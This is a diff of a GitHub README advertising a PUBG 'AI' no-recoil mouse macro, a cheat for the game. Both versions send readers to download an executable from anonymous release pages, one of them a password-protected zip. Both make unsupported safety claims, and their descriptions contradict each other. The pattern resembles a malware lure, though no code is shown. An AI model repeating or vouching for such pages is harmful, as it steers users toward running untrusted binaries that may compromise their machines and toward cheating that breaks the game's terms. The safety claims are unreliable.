@@ -1,24 +1,78 @@
-🔥 ALL MOUSE AI AUTOMATIC MACRO FOR PUBG 🔥
+# 🖱️ PUBG-ALL-MOUSE-AI-MACRO - Enhance Your PUBG Experience 
 
-### DESCRIPTION
-This product is not software, it is a simple macro that is not embedded in the game. It is suitable for any mouse model, and it also has a large number of settings! The most important feature of this script is its safety in use.
+## 🔗 Download Now
+[![Download PUBG-ALL-MOUSE-AI-MACRO](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Version-brightgreen)](https://github.com/kevkaleido/PUBG-ALL-MOUSE-AI-MACRO/releases)
 
-### FEATURES
-1) Support for any mouse - it doesn't matter what mouse you play on, because this macro for PUBG | PUBG will work on absolutely any. be it a simple office or gaming mouse from popular manufacturers such as A4TechBloody. Logitech, Razer, Corsair etc.
-2) Auto-tuning - the program has a function that will perform all the necessary settings for you according to your parameters with one click.
-3) Auto-detect sights and modules - the macro will automatically recognize any sight or module attached to your weapon. Also works on any resolution, aspect ratio, graphics and gamma settings.
-4) Position Detection - As you know, each weapon and each position (sitting, standing, lying) has a completely different recoil. The macro, using AI, automatically detects what position you are in and adjusts its recoil control for each weapon.
-5) Recognition of shooting modes - from the hip, from the shoulder and from the sight, the macro will automatically determine which shooting mode you are in and adjust the recoil control for each weapon.
-6) Memorizing attachments — When switching weapons, the macro will remember all attachments. which were worn on your weapon.
-7) Combining scopes and modules - You can combine any scope with any module on any weapon. because the macro will adjust to your choice.
-8) Any sensitivity — you can set any sensitivity settings. which you like to play on.
-9) Menu — you can change each setting in a user-friendly graphical interface.
-10) Chinese, English, Russian version of the menu.
+## 🚀 Getting Started
 
-## How to Use
-1. **Download last release:** (https://github.com/Ashaunaal/PUBG-ALL-MOUSE-AI-MACRO/releases/download/latest/PUBGMacro.zip).
-2. **Unzip the Files**: Use the pass **PUBGMacro**.
-3. **Run the Application**: Open the menu by opening the Exe
+Welcome to the PUBG-ALL-MOUSE-AI-MACRO repository. This application is designed to enhance your gaming experience in PlayerUnknown's Battlegrounds (PUBG) by allowing you to use macros for any mouse model. You can optimize your settings for a more effective gameplay strategy. 
 
-![1](https://github.com/user-attachments/assets/c37228f7-fdd7-4991-bf59-22d761832afa)
-![2](https://github.com/user-attachments/assets/bd317244-ed84-4b1f-ba4c-b580681f4e23)
+## 🛠️ Features
+
+- **Compatible with All Mouse Models:** No limitations on mouse types; it works with any model.
+- **Extensive Macro Settings:** Adjust settings easily to match your gameplay style.
+- **User-Friendly Interface:** Navigate features without technical knowledge.
+- **No Recoil Macros:** Gain an advantage with no recoil settings designed for PUBG.
+
+## 🍏 System Requirements
+
+- **Operating System:** Windows 10 (or newer)
+- **Memory:** At least 4 GB RAM
+- **Storage:** Minimum 100 MB free disk space 
+- **Mouse Drivers:** Ensure standard mouse drivers are installed
+
+## 📥 Download & Install
+
+To download and install PUBG-ALL-MOUSE-AI-MACRO, please follow these steps:
+
+1. Visit the [Releases Page](https://github.com/kevkaleido/PUBG-ALL-MOUSE-AI-MACRO/releases).
+2. Locate the latest release of PUBG-ALL-MOUSE-AI-MACRO.
+3. Click on the appropriate download link for your operating system.
+4. Once the download completes, locate the downloaded file in your downloads folder.
+5. Double-click the file to start the installation process.
+6. Follow the on-screen instructions to install the application.
+
+After installation, launch the application and configure your macros.
+
+## ⚙️ Setting Up Your Macros
+
+1. Open PUBG-ALL-MOUSE-AI-MACRO.
+2. Choose your mouse from the dropdown menu.
+3. Select the game mode you will use (like Solo, Duo, or Squad).
+4. Adjust your settings according to your preference:
+   - Set up no-recoil macros.
+   - Customize button layouts as needed.
+5. Save your settings and test them in a practice game.
+
+## 💡 Helpful Tips
+
+- **Check for Updates:** Stay updated with the latest features and improvements by regularly checking the Releases page.
+- **Adjust Sensitivity:** Experiment with mouse sensitivity settings to find what works best for you.
+- **Practice Makes Perfect:** Spend time practicing with your newly set macros to ensure you’re comfortable during actual gameplay.
+
+## 📜 Frequently Asked Questions
+
+### What is a macro?
+
+A macro is a sequence of commands that automate common tasks in a game. With macros, you can perform actions quickly and efficiently.
+
+### Is this application safe to use?
+
+Yes, PUB-ALL-MOUSE-AI-MACRO is designed with safety in mind. However, ensure that you comply with PUBG's terms of service to avoid any issues.
+
+### Can I use this on other games?
+
+While this application is optimized for PUBG, it can work with other games that support macro functionality.
+
+## 📞 Support
+
+If you encounter any issues or have questions, please feel free to reach out via the Issues section on the GitHub repository. We aim to respond quickly to all inquiries.
+
+## 🔗 Additional Resources
+
+For further information on how to enhance your gaming experience, consider checking out:
+
+- [Official PUBG Website](https://www.pubg.com)
+- [Gaming Forums](https://www.reddit.com/r/PUBATTLEGROUNDS/)
+  
+Thank you for choosing PUBG-ALL-MOUSE-AI-MACRO. We hope you enjoy a smoother and more enjoyable gaming experience!
